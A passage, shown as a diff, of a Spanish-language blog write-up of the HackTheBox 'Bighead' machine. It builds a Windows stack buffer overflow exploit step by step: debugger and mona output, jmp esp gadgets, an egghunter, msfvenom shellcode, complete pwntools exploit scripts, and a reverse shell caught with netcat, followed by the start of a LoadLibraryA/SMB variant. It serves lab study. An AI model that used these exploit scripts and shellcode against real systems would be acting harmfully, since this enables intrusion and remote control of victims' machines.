+00e22871  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e22881  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e22891  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e228a1  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+
+</span><span class="ro">0:000></span><span class="p"> !address 0x00e22861
+
+Usage:                  Heap
+Base Address:           00e20000
+End Address:            00e25000
+Region Size:            00005000 (  20.000 kB)
+State:                  00001000          MEM_COMMIT
+Protect:                00000004          PAGE_READWRITE
+Type:                   00020000          MEM_PRIVATE
+Allocation Base:        00e20000
+Allocation Protect:     00000004          PAGE_READWRITE
+More info:              heap owning the address: !heap -s -h 0xe20000
+More info:              heap segment
+More info:              heap entry containing the address: !heap -x 0xe22861  
+
+Content source: 1 (target), length: 279f</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo siguiente será detectar los badchars que no puede contener nuestro shellcode, para ello crearemos un array de los <code class="language-plaintext highlighter-rouge">256</code> posibles caracteres utilizando <code class="language-plaintext highlighter-rouge">mona</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !py mona bytearray
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\windbg\x86\mona.py bytearray
+Generating table, excluding 0 bad chars...
+Dumping table to file
+[+] Preparing output file 'bytearray.txt'
+    - (Re)setting logfile C:\mona\bytearray.txt
+"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"  
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"  
+"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"  
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"  
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"  
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"  
+"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"  
+"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  
+
+Done, wrote 256 bytes to file C:\mona\bytearray.txt
+Binary output saved in C:\mona\bytearray.bin</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En lugar de <code class="language-plaintext highlighter-rouge">D's</code> enviaremos los badchars ya que podemos conocer su ubicación</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">shellcode  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"  
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"  
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"  
@@ -865,14 +666,199 @@ shell.close()</span>
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Repetimos el proceso de buscar la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> y lo que nos interesa es la dirección despues de esa cadena justo donde inician los bytes <code class="language-plaintext highlighter-rouge">00 01 02 03 ..</code></p>
-<a href="/hackthebox/bighead/28.png" target="_blank"><div><p><img src="/hackthebox/bighead/28.png"></p></div></a>
-
-<p class="plain-text">Si con mona comparamos el <code class="language-plaintext highlighter-rouge">bytearray</code> con el contenido de esa direccion nos dice que todo el array no se ha modificado lo que significa que no hay ningun <code class="language-plaintext highlighter-rouge">badchar</code></p>
+<p class="plain-text">Ahora al encontrar la dirección de nuestro huevo sabemos que <code class="language-plaintext highlighter-rouge">8</code> bytes después deberian de estar los badchars, al comparar los bytes originales con la memoria podemos ver que ninguno de los <code class="language-plaintext highlighter-rouge">256</code> bytes causaron conflicto con la petición</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("compare -f bytearray.bin -a 00973CB6")</span>
+<code><span class="ro">0:000></span><span class="p"> g
+(bc8.3d54): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0104fb14 ebx=00000184 ecx=00871728 edx=01000000 esi=0040194e edi=0040194e
+eip=42424242 esp=0104fb3c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+42424242 ??              ???
+
+</span><span class="ro">0:000></span><span class="p"> s -a 0 L?80000000 w00tw00t
+00872861  77 30 30 74 77 30 30 74-00 01 02 03 04 05 06 07  w00tw00t........
+
+</span><span class="ro">0:000></span><span class="p"> !py mona compare -f C:\mona\bytearray.bin -a 0x00872869
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\windbg\x86\mona.py compare -f C:\mona\bytearray.bin -a 00872869  
+[+] Reading file C:\mona\bytearray.bin...
+    Read 256 bytes from file
+[+] Preparing output file 'compare.txt'
+    - (Re)setting logfile C:\mona\compare.txt
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+[+] C:\mona\bytearray.bin has been recognized as RAW bytes.
+[+] Fetched 256 bytes successfully from C:\mona\bytearray.bin
+    - Comparing 1 location(s)
+Comparing bytes from file with memory :
+0x00872869 | [+] Comparing with memory at location : 0x00872869 (Heap)
+0x00872869 | !!! Hooray, normal shellcode unmodified !!!</span>
 </code></pre></div></div><br>
-<a href="/hackthebox/bighead/29.png" target="_blank"><div><p><img src="/hackthebox/bighead/29.png"></p></div></a>
+
+<p class="plain-text">Revisemos los módulos cargados en memoria en el momento de ejecución que no pertenezcan al sistema, encontramos el <code class="language-plaintext highlighter-rouge">.exe</code> y 2 <code class="language-plaintext highlighter-rouge">.dll</code> pero uno lo descargamos por nuestra cuenta, el <code class="language-plaintext highlighter-rouge">.exe</code> no podemos usarlo porque la dirección base contiene un null byte que debemos evitar en el método <code class="language-plaintext highlighter-rouge">HEAD</code>, asi que solo nos queda <code class="language-plaintext highlighter-rouge">bheadsvr.dll</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !py mona modules -cm os=false
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\windbg\x86\mona.py modules -cm os=false
+
+---------- Mona command started on 2024-07-23 00:21:23 (v2.0, rev 636) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+    - Module criteria : ['os=false']
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+----------------------------------------------------------------------------------------------------------------------------------------------  
+ Module info :
+----------------------------------------------------------------------------------------------------------------------------------------------  
+ Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename, DLLCharacteristics
+----------------------------------------------------------------------------------------------------------------------------------------------  
+ 0x00400000 | 0x00413000 | 0x00013000 | False  | False   | False | False |  False   | False  | -1.0- [BigheadWebSvr.exe] 0x0
+ 0x62500000 | 0x62510000 | 0x00010000 | False  | False   | False | False |  False   | False  | -1.0- [bHeadSvr.dll] 0x0
+ 0x64540000 | 0x64570000 | 0x00030000 | False  | False   | False | False |  False   | False  | -1.0- [libmingwex-0.dll] 0x0
+----------------------------------------------------------------------------------------------------------------------------------------------  
+
+[+] Preparing output file 'modules.txt'
+    - (Re)setting logfile C:\mona\modules.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora buscamos el gadget <code class="language-plaintext highlighter-rouge">jmp esp</code> al ejecutarse saltará al stack ejecutando todo el shellcode que se encuentre ahi, que en este caso será un simple <code class="language-plaintext highlighter-rouge">egghunter</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000> </span><span class="p">!py mona jmp -r esp -m bheadsvr.dll
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\windbg\x86\mona.py jmp -r esp -m bheadsvr.dll
+
+---------- Mona command started on 2024-07-23 00:21:56 (v2.0, rev 636) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+    - Only querying modules bheadsvr.dll
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+[+] Querying 1 modules
+    - Querying module bHeadSvr.dll
+	- Search complete, processing results
+[+] Preparing output file 'jmp.txt'
+    - (Re)setting logfile C:\mona\jmp.txt
+[+] Writing results to C:\mona\jmp.txt
+    - Number of pointers of type 'jmp esp' : 9 
+[+] Results : 
+0x625012f0 |   0x625012f0 : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0
+0x625012fd |   0x625012fd : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0
+0x6250130a |   0x6250130a : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x62501317 |   0x62501317 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x62501324 |   0x62501324 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x62501331 |   0x62501331 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x6250133e |   0x6250133e : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x6250134b |   0x6250134b : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x6250134d |   0x6250134d : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+    Found a total of 9 pointers</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el stack en lugar del shellcode enviaremos un <code class="language-plaintext highlighter-rouge">egghunter</code> que ya analizamos antes en otro <a href="/exploitdevelopment/windows-user/egghunters#egg">post</a> de exploit, este podemos generarlo con mona y es un código muy pequeño que busca un huevo en toda la memoria en este caso w00tw00t para ejecutar todo lo que está despues que será nuestro verdadero shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !py mona egghunter
+Hold on...
+[+] Command used:
+!py C:\Users\gatog\Documents\WinDbgX\x86\mona.py egghunter
+[+] Egg set to w00t
+[+] Generating traditional 32bit egghunter code
+[+] Preparing output file 'egghunter.txt'
+    - (Re)setting logfile C:\mona\egghunter.txt
+[+] Egghunter  (32 bytes): 
+"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"  
+"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para evitar tener que abrir un listener en una shell simplemente con <code class="language-plaintext highlighter-rouge">msfvenom</code> crearemos un <code class="language-plaintext highlighter-rouge">shellcode</code> que ejecute <code class="language-plaintext highlighter-rouge">calc.exe</code> para comprobar que funcione</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/exec CMD=calc.exe -f python -v shellcode
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 193 bytes
+Final size of python file: 1095 bytes
+shellcode =  b""
+shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
+shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
+shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
+shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
+shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
+shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
+shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
+shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
+shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
+shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
+shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
+shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
+shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
+shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
+shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
+shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
+shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
+shellcode += b"\x63\x2e\x65\x78\x65\x00"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Resumiendo, la primera parte del exploit envia un huevo seguido del <code class="language-plaintext highlighter-rouge">shellcode</code> para guardarlo en memoria, la segunda explota la vulnerabilidad y ejecuta un <code class="language-plaintext highlighter-rouge">egghunter</code> que buscara el huevo en toda la memoria para asi ejecutar el shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
+
+egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="p">
+
+shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x63\x2e\x65\x78\x65\x00</span><span class="s">"</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">egg</span><span class="o"> +</span><span class="p"> shellcode
+
+content</span><span class="o"> =</span><span class="no"> b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">"</span><span class="o"> +</span><span class="p"> payload
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 8008</span><span class="p">)
+shell.sendline(content)
+shell.close()
+
+offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f0</span><span class="p">)
+
+egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74</span><span class="s">"</span><span class="p">  
+egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s">"</span><span class="p">  
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">egghunter
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
+shell.sendline(content)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit podemos ver que abre una calculadora por lo que ha funcionado</p>
+<a href="/hackthebox/bighead/26.png" target="_blank"><div><p><img src="/hackthebox/bighead/26.png"></p></div></a>
 
 <p class="plain-text">Lo que nos queda es crear un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code> que en caso de ejecutarse nos envie una <code class="language-plaintext highlighter-rouge">reverse shell</code> en windows a nuestro host por el puerto 443</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -920,7 +906,7 @@ shellcode += b"\xf4\x46\x8e\x23\x77\x62\x6f\xd0\x67\x07\x6a"
 shellcode += b"\x9c\x2f\xf4\x06\x8d\xc5\xfa\xb5\xae\xcf"</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nuestro script final consta de 2 etapas, la primera peticion simplemente guarda el <code class="language-plaintext highlighter-rouge">egg</code> seguido del <code class="language-plaintext highlighter-rouge">shellcode</code> en algun lugar de la memoria, la segunda desborda el buffer y al saltar al <code class="language-plaintext highlighter-rouge">ESP</code> ejecuta el <code class="language-plaintext highlighter-rouge">egghunter</code>, este buscara el egg que es la cadena <code class="language-plaintext highlighter-rouge">w00t</code> 2 veces en la memoria y ejecutara lo que esta despues que es el <code class="language-plaintext highlighter-rouge">shellcode</code></p>
+<p class="plain-text">Nuestro script final consta de 2 etapas, la primera peticion simplemente guarda el <code class="language-plaintext highlighter-rouge">egg</code> seguido del <code class="language-plaintext highlighter-rouge">shellcode</code> en algun lugar de la memoria, la segunda desborda el buffer y al saltar al <code class="language-plaintext highlighter-rouge">esp</code> ejecuta el <code class="language-plaintext highlighter-rouge">egghunter</code>, este buscara el egg que es la cadena <code class="language-plaintext highlighter-rouge">w00t</code> 2 veces en la memoria y ejecutara lo que esta despues que es el <code class="language-plaintext highlighter-rouge">shellcode</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
@@ -966,9 +952,7 @@ payload </span><span class="o">= </span><span class="p">egg </span><span class="
 content </span><span class="o">= </span><span class="no">b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">" </span><span class="o">+ </span><span class="p">payload
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"dev.bighead.htb"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
-
 shell.sendline(content)
-shell.recv()
 shell.close()
 
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
@@ -990,7 +974,7 @@ shell.sendline(content)
 shell.close()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ejecutamos el <code class="language-plaintext highlighter-rouge">exploit</code> y envia ambas peticiones, hay que tener en cuenta que es posible que el servidor demore hasta <code class="language-plaintext highlighter-rouge">10 o 15 minutos</code> en ejecutar el payload</p>
+<p class="plain-text">Ejecutamos el <code class="language-plaintext highlighter-rouge">exploit</code> y envia ambas peticiones, como resultado de explotarlo obtenemos una <code class="language-plaintext highlighter-rouge">shell</code> en el equipo victima como el usuario local <code class="language-plaintext highlighter-rouge">nelson</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
 [</span><span class="ve">+</span><span class="p">] Opening connection to dev.bighead.htb on port 80: Done  
@@ -999,7 +983,6 @@ shell.close()</span>
 [</span><span class="az">*</span><span class="p">] Closed connection to dev.bighead.htb port 80</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Despues de esperar un par de minutos se ejecuta nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> y como resultado obtenemos una <code class="language-plaintext highlighter-rouge">shell</code> en el equipo victima como el usuario local <code class="language-plaintext highlighter-rouge">nelson</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
 Listening on 0.0.0.0 443
@@ -1007,7 +990,7 @@ Connection received on 10.10.10.112
 Microsoft Windows [Version 6.0.6002]
 Copyright (c) 2006 Microsoft Corporation. All rights reserved.  
 
-C:\nginx></span><span class="am">whoami</span><span class="p">
+C:\nginx> </span><span class="am">whoami</span><span class="p">
 piedpiper\nelson
 
 C:\nginx></span>
@@ -1019,7 +1002,29 @@ C:\nginx></span>
 <br><h3 class="post-title">Buffer Overflow - loadlibrary</h3><br>
 
 <p class="plain-text">Otra forma de explotarlo es a traves de la función <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> que importa el dll</p>
-<a href="/hackthebox/bighead/35.png" target="_blank"><div><p><img src="/hackthebox/bighead/35.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000> </span><span class="p">!py mona getiat -m bheadsvr.dll -s loadlibrary
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\windbg\x86\mona.py getiat -m bheadsvr.dll -s loadlibrary
+
+---------- Mona command started on 2024-07-23 00:36:34 (v2.0, rev 636) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+    - Only querying modules bheadsvr.dll
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+[+] Querying 1 modules
+[+] Preparing output file 'iatsearch.txt'
+    - (Re)setting logfile C:\mona\iatsearch.txt
+    Getting IAT for bHeadSvr.dll.
+    Enumerating IAT
+0x625070c8 | At 0x625070c8 in bheadsvr (base + 0x000070c8) : 0x778c0ed0 (ptr to KERNEL32.loadlibraryexa) - [KERNEL32] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.22621.3672, 0x4140  
+
+1 entries found</span>
+</code></pre></div></div><br>
 
 <p class="plain-text">La función <a href="https://learn.microsoft.com/es-es/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a> es bastante simple, solo recibe como <code class="language-plaintext highlighter-rouge">parametro</code> el nombre de la libreria, por lo que si la controlamos podemos cargar un <code class="language-plaintext highlighter-rouge">dll</code> malicioso</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -1028,66 +1033,96 @@ C:\nginx></span>
 );</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para lo que vamos a hacer necesitamos que el <code class="language-plaintext highlighter-rouge">ESP</code> este libre asi que buscaremos una direccion con un jmp a <code class="language-plaintext highlighter-rouge">EAX</code> que apunta a el inicio del input que introducimos</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("jmp -r eax -m bheadsvr.dll")</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/bighead/31.png" target="_blank"><div><p><img src="/hackthebox/bighead/31.png"></p></div></a>
-
-<p class="plain-text">Primero enviaremos una variable <code class="language-plaintext highlighter-rouge">dll</code> que por ahora no vale nada pero seran las instrucciones que ejecutara el <code class="language-plaintext highlighter-rouge">jmp eax</code>, rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al <code class="language-plaintext highlighter-rouge">EIP</code> y saltamos al <code class="language-plaintext highlighter-rouge">EAX</code>, despues de eso enviamos la ruta <code class="language-plaintext highlighter-rouge">smb</code> donde estara nuestro dll</p>
